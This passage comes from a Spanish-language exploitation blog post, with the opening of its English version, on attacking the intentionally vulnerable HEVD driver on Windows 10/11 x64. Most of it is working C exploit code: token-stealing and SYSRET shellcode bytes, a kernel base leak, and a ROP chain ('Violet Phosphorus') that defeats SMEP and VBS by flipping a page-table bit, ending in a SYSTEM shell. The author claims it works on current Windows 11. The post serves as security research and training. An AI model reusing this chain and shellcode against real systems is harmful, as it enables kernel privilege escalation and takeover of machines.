Con esto dicho, podemos seguir adelante y saltar a desarrollando un versión para Windows 10 (x64).\nComo fue mencionado en el último artículo cambiaremos el lenguaje de programación a C en lugar de Python. Si estás usando Kali y quieres seguir conmigo, instalar mingw-w64. Esto será lo que usaré para compilar mi código. También puedes usar Visual Studio en realidad todo es preferencia.\nsudo apt install mingw-w64 -y Si todavía estás aprendiendo C, y lo prefieres, todo se puede lograr en Python. Yo intencionalmente escribí el código del último artículo en Python para que sirva como ejemplo para aquellos que no quieran usar C.\nSin embargo, pronto verás que cuanto más de dentres a explotación, más se necesita conocimiento de C.\nEsto no es opcional.\nEmpecemos mirando el \u0026ldquo;exploit\u0026rdquo; inicial:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #define BUFFER_SIZE 4242 int main() { HANDLE hHEVD = NULL; DWORD bytesReturned = 0; char buffer[BUFFER_SIZE] = {0}; printf(\u0026#34;[*] Getting a handle on HEVD\\n\u0026#34;); hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Generating evil buffer...\u0026#34;); memset(buffer, \u0026#39;A\u0026#39;, 3000); printf(\u0026#34;[*] Triggering control code 0x222003\\n\u0026#34;); DeviceIoControl(hHEVD, 0x222003, buffer, BUFFER_SIZE, NULL, 0x00, \u0026amp;bytesReturned, NULL); } Lo podemos compilar usando un compilador cruzado dentro de mingw sobre Linux (x86_64-w64-mingw32-gcc poc.c -o poc.exe). Una vez enviado, podremos ver que hemos obtenido corrupción de la memoria :)\nCambiemos este código, esta vez incluiremos shellcode (Generado con Sickle).\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #define BUFFER_SIZE 4242 int main() { HANDLE hHEVD = NULL; LPVOID lpMemory = NULL; DWORD bytesReturned = 0; int i = 0; int shellcodeLength = 62; int64_t buffer[BUFFER_SIZE] = {0}; char shellcode[] = // python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint \u0026#34;\\x65\\x48\\xa1\\x88\\x01\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; // movabs rax, qword ptr gs:[0x188] \u0026#34;\\x48\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#34; // mov rax, qword ptr [rax + 0xb8] \u0026#34;\\x48\\x89\\xc1\u0026#34; // mov rcx, rax \u0026#34;\\xb2\\x04\u0026#34; // mov dl, 4 \u0026#34;\\x48\\x8b\\x80\\x48\\x04\\x00\\x00\u0026#34; // mov rax, qword ptr [rax + 0x448] \u0026#34;\\x48\\x2d\\x48\\x04\\x00\\x00\u0026#34; // sub rax, 0x448 \u0026#34;\\x38\\x90\\x40\\x04\\x00\\x00\u0026#34; // cmp byte ptr [rax + 0x440], dl \u0026#34;\\x75\\xeb\u0026#34; // jne 0x1017 \u0026#34;\\x48\\x8b\\x90\\xb8\\x04\\x00\\x00\u0026#34; // mov rdx, qword ptr [rax + 0x4b8] \u0026#34;\\x48\\x89\\x91\\xb8\\x04\\x00\\x00\u0026#34; // mov qword ptr [rcx + 0x4b8], rdx \u0026#34;\\x5d\u0026#34; // pop rbp \u0026#34;\\xc2\\x08\\x00\u0026#34;; // ret 8 printf(\u0026#34;[*] Getting a handle on HEVD\\n\u0026#34;); hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Allocating RWX memory\\n\u0026#34;); lpMemory = VirtualAlloc(NULL, shellcodeLength, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); printf(\u0026#34;[*] Copying shellcode into RWX memory\\n\u0026#34;); memcpy(lpMemory, shellcode, shellcodeLength); printf(\u0026#34;[*] Spraying return address: 0x%p\\n\u0026#34;, lpMemory); for (i = 0; i \u0026lt; 270; i++) { /* Spray the return address, who cares about accuracy ;) */ buffer[i] = (int64_t)lpMemory; } printf(\u0026#34;[*] Triggering control code 0x222003\\n\u0026#34;); DeviceIoControl(hHEVD, 0x222003, buffer, BUFFER_SIZE, NULL, 0x00, \u0026amp;bytesReturned, NULL); } Intentemos reservar memoria como lo hicimos antes en Windows 7 (x86). Cuando saltamos a la memoria, obtenemos este error:\nDespués de investigar un poco el error, podemos confirmar que estamos lidiando con SMEP (Prevención de Ejecución dentro de la Supervisora / Supervisor Mode Execution Prevention) que es una protección de memoria integrada dentro de sistemas de Windows desde Windows 8. Suponiendo que estas familiarizado con la explotación de \u0026ldquo;user-land\u0026rdquo; imagínete esto como DEP, solo que impide la ejecución dentro de procesos de \u0026ldquo;user-land\u0026rdquo;. En breve, SMEP esta configurando en el bit veinte del el registro CR4. Esto lo he simplificado demasiado, pero para este artículo no necesitamos saber más. Lo unico que tenemos que hacer es evadirlo, este es nuestro objetivo.\nEludiendo SMEP (Teoría) # En teoría, esto puede ser modificado por el Kernel, por eso ROP es un camino ideal para este problema.\nVeamos esto en WinDbg.\nAl voltear el bit de cualquier número, esencialmente estamos cambiando el valor. Para ver qué número necesitaríamos aquí, escribí un programa simple en C para generar el número para mí. El código para hacer esto se puede ver aquí:\n/* wetw0rk */ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; // https://stackoverflow.com/questions/111928/is-there-a-printf-converter-to-print-in-binary-format #define PRINTF_BINARY_PATTERN_INT8 \u0026#34;%c%c%c%c%c%c%c%c \u0026#34; #define PRINTF_BYTE_TO_BINARY_INT8(i) \\ (((i) \u0026amp; 0x80ll) ? \u0026#39;1\u0026#39; : \u0026#39;0\u0026#39;), \\ (((i) \u0026amp; 0x40ll) ? \u0026#39;1\u0026#39; : \u0026#39;0\u0026#39;), \\ (((i) \u0026amp; 0x20ll) ? \u0026#39;1\u0026#39; : \u0026#39;0\u0026#39;), \\ (((i) \u0026amp; 0x10ll) ? \u0026#39;1\u0026#39; : \u0026#39;0\u0026#39;), \\ (((i) \u0026amp; 0x08ll) ? \u0026#39;1\u0026#39; : \u0026#39;0\u0026#39;), \\ (((i) \u0026amp; 0x04ll) ? \u0026#39;1\u0026#39; : \u0026#39;0\u0026#39;), \\ (((i) \u0026amp; 0x02ll) ? \u0026#39;1\u0026#39; : \u0026#39;0\u0026#39;), \\ (((i) \u0026amp; 0x01ll) ? \u0026#39;1\u0026#39; : \u0026#39;0\u0026#39;) #define PRINTF_BINARY_PATTERN_INT16 \\ PRINTF_BINARY_PATTERN_INT8 PRINTF_BINARY_PATTERN_INT8 #define PRINTF_BYTE_TO_BINARY_INT16(i) \\ PRINTF_BYTE_TO_BINARY_INT8((i) \u0026gt;\u0026gt; 8), PRINTF_BYTE_TO_BINARY_INT8(i) #define PRINTF_BINARY_PATTERN_INT32 \\ PRINTF_BINARY_PATTERN_INT16 PRINTF_BINARY_PATTERN_INT16 #define PRINTF_BYTE_TO_BINARY_INT32(i) \\ PRINTF_BYTE_TO_BINARY_INT16((i) \u0026gt;\u0026gt; 16), PRINTF_BYTE_TO_BINARY_INT16(i) #define PRINTF_BINARY_PATTERN_INT64 \\ PRINTF_BINARY_PATTERN_INT32 PRINTF_BINARY_PATTERN_INT32 #define PRINTF_BYTE_TO_BINARY_INT64(i) \\ PRINTF_BYTE_TO_BINARY_INT32((i) \u0026gt;\u0026gt; 32), PRINTF_BYTE_TO_BINARY_INT32(i) /* * flip_bit: simple function to flip a bit, for CR4 this would be 20 */ uint64_t flip_bit(uint64_t cr4, unsigned int bit_position) { unsigned int mask = 1 \u0026lt;\u0026lt; (bit_position - 1); return (cr4 ^ mask); } int main(int argc, char *argv[]) { uint64_t num = 0; if (argc \u0026lt; 2) { printf(\u0026#34;Usage: %s \u0026lt;current cr4 value\u0026gt;\\n\u0026#34;, argv[0]); return -1; } num = strtoll(argv[1], NULL, 0); printf(\u0026#34;OLD CR4:\\n\\n\\t\u0026#34;); printf(PRINTF_BINARY_PATTERN_INT64, PRINTF_BYTE_TO_BINARY_INT64(num)); putchar(\u0026#39;\\n\u0026#39;); num = flip_bit(num, 20); printf(\u0026#34;NEW CR4\\n\\n\\t\u0026#34;); printf(PRINTF_BINARY_PATTERN_INT64, PRINTF_BYTE_TO_BINARY_INT64(num)); putchar(\u0026#39;\\n\u0026#39;); printf(\u0026#34;\\nResult: 0x%lx\\n\u0026#34;, num); } Ejecutémoslo:\n$ ./get_cr4 0x0000000000b50ef8 OLD CR4: 00000000 00000000 00000000 00000000 00000000 10110101 00001110 11111000 NEW CR4 00000000 00000000 00000000 00000000 00000000 10111101 00001110 11111000 Result: 0xbd0ef8 Básicamente tenemos que mover este valor dentro de CR4 para apagar SMEP\u0026hellip; Mientras estudiaba métodos sobre cómo hacer esto me encontré una publicación por fluidattacks y observé que usaba un \u0026ldquo;gadget\u0026rdquo; de ROP dentro de el módulo nt, específicamente KeFlushCurrentTb. Podemos obtener nuestra versión de Windows usando Windbg con vertarget. Cuando lo ejecutamos, esta es la versión instalada:\nCon esto dicho. este \u0026ldquo;gadget\u0026rdquo; no estaría disponible para nosotros. Si buscamos otras funciones similares encontramos un \u0026ldquo;gadget\u0026rdquo; similar dentro de nt!KeFlushCurrentTbImmediatley con la diferencia principal siendo que usamos RCX sobre EAX para modificar el registro CR4:\nDado que las direcciones son aleatorias, necesitamos calcular la distancia a el ROP \u0026ldquo;gadget\u0026rdquo; desde el inicio del módulo nt:\nAquí vemos que el distancia es 0x000000000039dc27.\nEncontrar \u0026ldquo;Gadgets\u0026rdquo; y Como Usarlos # Ahora necesitamos encontrar un pop rcx; ret \u0026ldquo;gadget\u0026rdquo; para colocar el nuevo CR4 en RCX. La podemos encontrar usando rp++, que rápidamente se ha convertido en mi favorita herramienta para descubrimiento de \u0026ldquo;gadgets\u0026rdquo; de ROP. Aquí buscamos gadgets dentro de ntoskrnl.exe porque este es el módulo principal de el Kernel para el Windows OS. Puedes hacerlo así.\nrp-win.exe --rop=50 --va=0 --file C:\\Windows\\System32\\ntoskrnl.exe \u0026gt; rop.txt Luego podemos analizar los resultados con powershell.\nUsando estas distancias podemos confirmar que tenemos un \u0026ldquo;gadget\u0026rdquo; que trabaja en WinDbg.\nSin embargo, todavía tendremos que lidiar con la aleatorización de el módulo nt\u0026hellip;\nEncontrar la dirección base de el Kernel # Si pudieras ver dentro de mi mente durante este período de estudio, habrías visto puro temor. Dado que quando estas bajode \u0026ldquo;user-mode\u0026rdquo; normalmente necesitas una primitiva de leer para obtener la dirección de base para un módulo. Sin embargo, en mu investigación descubrirá que existen múltiples métodos para obtener la base de un módulo.\nTerminé usando un método conocido aprovechando EnumDeviceDrivers.\nEl código se puede ver aquí:\nint GetKernelBaseAddress() { ULONG_PTR pKernelBaseAddress = 0; LPVOID *lpImageBase = NULL; DWORD dwBytesNeeded = 0; if (!EnumDeviceDrivers(NULL, 0, \u0026amp;dwBytesNeeded)) { printf(\u0026#34;[-] Failed to calculate bytes needed for device driver entries\u0026#34;); return -1; } if (!(lpImageBase = (LPVOID *)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) { printf(\u0026#34;[-] Failed to allocate heap for lpImageBase\\n\u0026#34;); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, \u0026amp;dwBytesNeeded)) { printf(\u0026#34;[-] EnumDeviceDrivers: %d\u0026#34;, GetLastError()); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } pKernelBaseAddress = ((ULONG_PTR *)lpImageBase)[0]; HeapFree(GetProcessHeap(), 0, lpImageBase); printf(\u0026#34;[*] Kernel Base Address: %llx\\n\u0026#34;, pKernelBaseAddress); return pKernelBaseAddress; } Deberíamos tener todo lo necesario para ejecutar código! ¿Sí? No :(\nAl juntar todo, obtenemos el error visto arriba (ignorar la ubicación diferente del \u0026ldquo;gadget\u0026rdquo;, en este punto no podía entender que esto no funcionara y probé diferentes \u0026ldquo;gadgets\u0026rdquo;).\nQué pasó? Bueno.. parece que nos encontramos con una nueva protección de la memoria en que yo nunca he oído Seguridad basada en la virtualización / \u0026ldquo;Virtualization-Based Security\u0026rdquo; (VBS), que significa modificaciones que no son autorizadas a modificar secciones de el registro CR4, incluyendo SMEP estaran bloqueado instantáneamente\nEvadiendo VBS (Teoría) # Después de ver cómo otros han asumido esto, quedó claro que el idea es cambiar un bit dentro de un entrada dentro de una tabla de página o \u0026ldquo;Page Table Entry\u0026rdquo; (PTE) respectivo a la ubicación de la memoria para nuestro shellcode. Si no me recuerdo mal, cuando intentamos ejecutar el shellcode directamente, obtuvimos este error:\nBásicamente, la forma en que se aplica SMEP es por cada sección de memoria, por el \u0026ldquo;U/S PTE\u0026rdquo; bit. Veamos esto con !pte dentro de WinDbg contra nuestro shellcode en \u0026ldquo;userland\u0026rdquo; para entender los permisos sobre el PTE.\nEntonces, qué pasaría si aclaráramos el bit (U)? Si se voltea, en teoría esto se convierte en página de el Kernel. La ubicación de el bit U se mira aqui:\nEstablecer un punto de interrupción dentro de HEVD+0x866b9 y encender y apagar el VM. Una vez golpeado, podemos modificar PTE asi:\nUna vez ejecutado, podemos ver que obtuvimos la ejecución de código y sobrescribimos RAX con 0xDEADBEEF. Ahora tenemos una ruta sólida para evider SMEP y VBS pero cómo podemos hacer esto dinamicamente\u0026hellip;.\nViolet Phosphorus # Con nuestro análisis completo, decidí poner mi teoría en práctica y crea Violet Phosphorus un método universal para evadir SMEP/VBS. Podemos llamar a esto el sucesor de el White Phosphorus Exploit Pack? O sería demasiado\u0026hellip; puedes encontrar la cadena aquí:\n/* Prepare RDX register for later. This is needed for the XOR operation */ buffer[i++] = kernel_base + 0x3f99ce; // pop rdx ; pop rax ; pop rcx ; ret [nt] buffer[i++] = 0x000008; // Set RDX to 0x08, we will need this to accomplish the XOR buffer[i++] = 0x000000; // [filler] buffer[i++] = 0x000000; // [filler] /* Setup the call to MiGetPteAddress in order to get the address of the PTE for our userland code. The setup is as follows: RAX -\u0026gt; VOID *MiGetPteAddress( ( RCX == PTE / Userland Code ) ); Once the call is complete RAX should contain the pointer to our PTE. */ buffer[i++] = kernel_base + 0xa74d93; // pop rcx ; ret [nt] buffer[i++] = (int64_t)shellcode; // *shellcode [nt] buffer[i++] = kernel_base + 0x26b560; // MiGetPteAddress() [nt] /* Now that we have obtained the PTE address, we can modify the 2nd bit in order to mark the page as a kernel page (U -\u0026gt; K). We can do this using XOR ;) */ buffer[i++] = kernel_base + 0x2ffbfb; // sub rax, rdx ; ret [nt] buffer[i++] = kernel_base + 0xa6f2f5; // push rax ; pop rbx ; ret [nt] buffer[i++] = kernel_base + 0x3f99ce; // pop rdx ; pop rax ; pop rcx ; ret [nt] buffer[i++] = 0x000004; // When we XOR the PTE by 0x4 we flip the 2nd bit (U -\u0026gt; K) buffer[i++] = 0x000000; // [filler] buffer[i++] = 0x000000; // [filler] buffer[i++] = kernel_base + 0x2107b2; // xor [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret [nt] Entendiendo la Cadena de \u0026ldquo;ROP\u0026rdquo; # Si somos honestos, existen otras formas de evitar VBS/SMEP pero de lo que he visto la mayoría requiere un primitivo para leer memoria. Nosotros no necesitamos sufrir cuando Microsoft los da una función para obtener esta información dinámicamente. Aquí está el código dentro de WinDbg para la función MiGetPteAddress():\n0: kd\u0026gt; u nt!MiGetPteAddress nt!MiGetPteAddress: fffff800`4d67f770 48c1e909 shr rcx,9 fffff800`4d67f774 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h fffff800`4d67f77e 4823c8 and rcx,rax fffff800`4d67f781 48b80000000080f0ffff mov rax,0FFFFF08000000000h fffff800`4d67f78b 4803c1 add rax,rcx fffff800`4d67f78e c3 ret Por lo que he visto en el \u0026ldquo;público\u0026rdquo;, normalmente la gente usa esta función para filtrar la dirección base de todos los PTE\u0026rsquo;s. Demos un paso atrás y preguntémonos qué hace realmente esta función? Nosotras ni siquiera necesitamos Ghidra para hazer esto. Escribamos código en C para demostrar esto:\n/* wetw0rk */ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; int64_t MiGetPteAddress(int64_t rcx) { int64_t rax = 0x00; rcx = rcx \u0026gt;\u0026gt; 9; rax = 0x7FFFFFFFF8; rcx = rcx \u0026amp; rax; rax = 0x0FFFFF08000000000; rax = rax + rcx; return rax; } int main() { printf(\u0026#34;PTE Located @{ 0x%llx }\\n\u0026#34;, MiGetPteAddress(0x00000220c16d0000)); } Si compilamos esto, vemos que nos da la dirección del PTE.\n┌──(wetw0rk㉿kali)-[~] └─$ gcc MiGetPteAddress.c -o meme ┌──(wetw0rk㉿kali)-[~] └─$ ./meme PTE Located @{ 0xfffff0811060b680 } Esto significa que podemos aprovechar esta función existente para manipular la PTE directamente. Tenga en cuenta que estamos corriendo en el contexto de el Kernel, esto significa que podemos llamar Bill Gates si queremos.\nAhora, todo lo que tenemos que hacer es pasarle a esta función la dirección de nuestro shellcode y, a cambio, esta función devolverá el PTE respectivo a nuestra memoria. Que perfecto :)\nTener la dirección del PTE, nosotros simplemente necesitamos voltear el U bit a K. Qué operación de matemática tan duro que un profesor de Harvard incluso sufriría haciendo?\nXOR!\n\u0026gt;\u0026gt;\u0026gt; \u0026#34;0x\u0026#34; + hex(0x0000000226D83867 ^ 4)[2:].zfill(16) \u0026#39;0x0000000226d83863\u0026#39; Sabes lo que esto significa?\nCreando una Prueba de Concepto (POC) # En este punto tenemos todo lo que necesitamos para ejecutar código\u0026hellip; pero el regreso a \u0026ldquo;userland\u0026rdquo;. Normalmente es mejor restaurar el flujo de ejecución manualmente. Sin embargo, decidí usar en su lugar \u0026ldquo;Kristal-G\u0026rsquo;s SYSRET\u0026rdquo; shellcode - una técnica genérica que permite que regresemos del Kernel. Según tengo entendido este código es el primero de su tipo (aparte de la versión de Linux). Puedes generar el código de Kristal-G sobre Sickle como se demuestra aquí:\n┌──(wetw0rk㉿kali)-[/opt/Sickle/src] └─$ python3 sickle.py -p windows/x64/kernel_sysret -f c -m pinpoint \u0026#34;\\x65\\x48\\xa1\\x88\\x01\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; // movabs rax, qword ptr gs:[0x188] \u0026#34;\\x66\\x8b\\x88\\xe4\\x01\\x00\\x00\u0026#34; // mov cx, word ptr [rax + 0x1e4] \u0026#34;\\x66\\xff\\xc1\u0026#34; // inc cx \u0026#34;\\x66\\x89\\x88\\xe4\\x01\\x00\\x00\u0026#34; // mov word ptr [rax + 0x1e4], cx \u0026#34;\\x48\\x8b\\x90\\x90\\x00\\x00\\x00\u0026#34; // mov rdx, qword ptr [rax + 0x90] \u0026#34;\\x48\\x8b\\x8a\\x68\\x01\\x00\\x00\u0026#34; // mov rcx, qword ptr [rdx + 0x168] \u0026#34;\\x4c\\x8b\\x9a\\x78\\x01\\x00\\x00\u0026#34; // mov r11, qword ptr [rdx + 0x178] \u0026#34;\\x48\\x8b\\xa2\\x80\\x01\\x00\\x00\u0026#34; // mov rsp, qword ptr [rdx + 0x180] \u0026#34;\\x48\\x8b\\xaa\\x58\\x01\\x00\\x00\u0026#34; // mov rbp, qword ptr [rdx + 0x158] \u0026#34;\\x31\\xc0\u0026#34; // xor eax, eax \u0026#34;\\x0f\\x01\\xf8\u0026#34; // swapgs \u0026#34;\\x48\\x0f\\x07\u0026#34; // sysretq Aquí está el código, ten en cuenta que las distancias pueden ser diferentes según el versión de Windows:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; // I/O Request Packets (IRPs) #define TRIGGER_BUFFER_OVERFLOW_STACK 0x222003 #define BUFFER_SIZE 4242 uint64_t GetKernelBaseAddress() { ULONG_PTR pKernelBaseAddress = 0; LPVOID *lpImageBase = NULL; DWORD dwBytesNeeded = 0; if (!EnumDeviceDrivers(NULL, 0, \u0026amp;dwBytesNeeded)) { printf(\u0026#34;[-] Failed to calculate bytes needed for device driver entries\u0026#34;); return -1; } if (!(lpImageBase = (LPVOID *)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) { printf(\u0026#34;[-] Failed to allocate heap for lpImageBase\\n\u0026#34;); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, \u0026amp;dwBytesNeeded)) { printf(\u0026#34;[-] EnumDeviceDrivers: %d\u0026#34;, GetLastError()); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } pKernelBaseAddress = ((ULONG_PTR *)lpImageBase)[0]; HeapFree(GetProcessHeap(), 0, lpImageBase); printf(\u0026#34;[*] Kernel Base Address: %llx\\n\u0026#34;, pKernelBaseAddress); return pKernelBaseAddress; } void GenerateBuffer(int64_t *buffer, int64_t kernel_base, LPVOID shellcode) { int64_t i = 259; int64_t j = 0; printf(\u0026#34;[*] Generating buffer to bypass VPS and disable SMEP\\n\u0026#34;); /* Prepare RDX register for later. This is needed for the XOR operation */ buffer[i++] = kernel_base + 0x3f99ce; // pop rdx ; pop rax ; pop rcx ; ret [nt] buffer[i++] = 0x000008; // Set RDX to 0x08, we will need this to accomplish the XOR buffer[i++] = 0x000000; // [filler] buffer[i++] = 0x000000; // [filler] /* Setup the call to MiGetPteAddress in order to get the address of the PTE for our userland code. The setup is as follows: RAX -\u0026gt; VOID *MiGetPteAddress( ( RCX == PTE / Userland Code ) ); Once the call is complete RAX should contain the pointer to our PTE. */ buffer[i++] = kernel_base + 0xa74d93; // pop rcx ; ret [nt] buffer[i++] = (int64_t)shellcode; // *shellcode [nt] buffer[i++] = kernel_base + 0x26b560; // MiGetPteAddress() [nt] /* Now that we have obtained the PTE address, we can modify the 2nd bit in order to mark the page as a kernel page (U -\u0026gt; K). We can do this using XOR ;) */ buffer[i++] = kernel_base + 0x2ffbfb; // sub rax, rdx ; ret [nt] buffer[i++] = kernel_base + 0xa6f2f5; // push rax ; pop rbx ; ret [nt] buffer[i++] = kernel_base + 0x3f99ce; // pop rdx ; pop rax ; pop rcx ; ret [nt] buffer[i++] = 0x000004; // When we XOR the PTE by 0x4 we flip the 2nd bit (U -\u0026gt; K) buffer[i++] = 0x000000; // [filler] buffer[i++] = 0x000000; // [filler] buffer[i++] = kernel_base + 0x2107b2; // xor [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret [nt] /* Now we can spray our shellcode address since SMEP and VPS should be bypassed */ for (j = 0; j \u0026lt; 0xC; j++) { buffer[i++] = (int64_t)shellcode; } printf(\u0026#34;[*] Calling shellcode: 0x%p\\n\u0026#34;, shellcode); } int main() { HANDLE hHEVD = NULL; DWORD bytesReturned = 0; int64_t buffer[BUFFER_SIZE] = {0}; int64_t kernelBaseAddr = 0; LPVOID lpMemory = NULL; char shellcode[] = // python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint \u0026#34;\\x65\\x48\\xa1\\x88\\x01\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; // movabs rax, qword ptr gs:[0x188] \u0026#34;\\x48\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#34; // mov rax, qword ptr [rax + 0xb8] \u0026#34;\\x48\\x89\\xc1\u0026#34; // mov rcx, rax \u0026#34;\\xb2\\x04\u0026#34; // mov dl, 4 \u0026#34;\\x48\\x8b\\x80\\x48\\x04\\x00\\x00\u0026#34; // mov rax, qword ptr [rax + 0x448] \u0026#34;\\x48\\x2d\\x48\\x04\\x00\\x00\u0026#34; // sub rax, 0x448 \u0026#34;\\x38\\x90\\x40\\x04\\x00\\x00\u0026#34; // cmp byte ptr [rax + 0x440], dl \u0026#34;\\x75\\xeb\u0026#34; // jne 0x1017 \u0026#34;\\x48\\x8b\\x90\\xb8\\x04\\x00\\x00\u0026#34; // mov rdx, qword ptr [rax + 0x4b8] \u0026#34;\\x48\\x89\\x91\\xb8\\x04\\x00\\x00\u0026#34; // mov qword ptr [rcx + 0x4b8], rdx // python3 sickle.py -p windows/x64/kernel_sysret -f c -m pinpoint \u0026#34;\\x65\\x48\\xa1\\x88\\x01\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; // movabs rax, qword ptr gs:[0x188] \u0026#34;\\x66\\x8b\\x88\\xe4\\x01\\x00\\x00\u0026#34; // mov cx, word ptr [rax + 0x1e4] \u0026#34;\\x66\\xff\\xc1\u0026#34; // inc cx \u0026#34;\\x66\\x89\\x88\\xe4\\x01\\x00\\x00\u0026#34; // mov word ptr [rax + 0x1e4], cx \u0026#34;\\x48\\x8b\\x90\\x90\\x00\\x00\\x00\u0026#34; // mov rdx, qword ptr [rax + 0x90] \u0026#34;\\x48\\x8b\\x8a\\x68\\x01\\x00\\x00\u0026#34; // mov rcx, qword ptr [rdx + 0x168] \u0026#34;\\x4c\\x8b\\x9a\\x78\\x01\\x00\\x00\u0026#34; // mov r11, qword ptr [rdx + 0x178] \u0026#34;\\x48\\x8b\\xa2\\x80\\x01\\x00\\x00\u0026#34; // mov rsp, qword ptr [rdx + 0x180] \u0026#34;\\x48\\x8b\\xaa\\x58\\x01\\x00\\x00\u0026#34; // mov rbp, qword ptr [rdx + 0x158] \u0026#34;\\x31\\xc0\u0026#34; // xor eax, eax \u0026#34;\\x0f\\x01\\xf8\u0026#34; // swapgs \u0026#34;\\x48\\x0f\\x07\u0026#34;; // sysretq int shellcodeLength = (58 + 71); kernelBaseAddr = GetKernelBaseAddress(); printf(\u0026#34;[*] Getting a handle on HEVD\\n\u0026#34;); hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Allocating RWX memory\\n\u0026#34;); lpMemory = VirtualAlloc(NULL, shellcodeLength, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); printf(\u0026#34;[*] Copying shellcode into RWX memory\\n\u0026#34;); memcpy(lpMemory, shellcode, shellcodeLength); printf(\u0026#34;[*] Spraying return address: 0x%p\\n\u0026#34;, lpMemory); GenerateBuffer(buffer, kernelBaseAddr, lpMemory); printf(\u0026#34;[*] Triggering control code 0x222003\\n\u0026#34;); DeviceIoControl(hHEVD, TRIGGER_BUFFER_OVERFLOW_STACK, buffer, BUFFER_SIZE, NULL, 0x00, \u0026amp;bytesReturned, NULL); system(\u0026#34;C:\\\\Windows\\\\System32\\\\cmd.exe\u0026#34;); } Explotación (Rip \u0026amp; Tear) # Al escribir este artículo tenía tanta confianza en mi técnica, que lo probé con la última versión de Windows 11 y tabajo!\nEs importante tener en cuenta que yo tenía que hacer modificaciones a la información mencionada dentro de este artículo por Windows 11. Por ejemplo, \u0026ldquo;Token Stealing Shellcode\u0026rdquo; distancias han cambiado. Esta fue una observación interesante y planeo hacer cambios a Sickle para adaptarse a los cambios.\nRecursos # https://connormcgarr.github.io/pte-overwrites/ https://m0uk4.gitbook.io/notebooks/mouka/windowsinternal/find-kernel-module-address-todo https://wumb0.in/finding-the-base-of-the-windows-kernel.html https://idafchev.github.io/research/2023/06/30/Vulnerable_Driver_Part2.html https://fluidattacks.com/blog/hevd-smep-bypass/ https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/# https://www.coresecurity.com/sites/default/files/2020-06/Windows%20SMEP%20bypass%20U%20equals%20S_0.pdf https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html ","date":"8 December 2024","externalUrl":null,"permalink":"/posts/0x01-mat%C3%A1ndo-windows-kernel-mitigaciones/","section":"Posts","summary":"","title":"0x01 - Matándo Windows Kernel Mitigaciones","type":"posts"},{"content":" ₍₍ (ง ˙ω˙)ว ⁾⁾ Hablas Español? Empújame! This post was made possible through hard work and determination. Do not feel frustrated if this stuff does not click immediately and remember, the source of truth will always be the source code. For us, our source code is raw assembly. That said it’s important you understand these techniques in detail because when Microsoft releases new mitigations your foundation is what will allow you to develop bypasses. So, if something is not clear take your time and step through it in the debugger.\nIn the last post you should have obtained a solid understanding of the basics of Windows Kernel Exploitation. We will now be jumping off the deep end and exploiting Windows 10 (x64) and Windows 11 (x64). Within this post you will be getting an introduction to some of the latest exploit mitigations offered by Microsoft and how \u0026ldquo;easily\u0026rdquo; they can be bypassed. That said only SOME will be covered, more exist but we will only cover them when relevant within this series.\nIn addition, this post will include the release of my PoC ROP chain - Violet Phosphorus, a universal VBS/SMEP bypass technique.\nTo prove its effectiveness, I went ahead deployed Violet Phosphorus against Windows 11 24H2 just for this post. If I understand correctly this is the latest version of 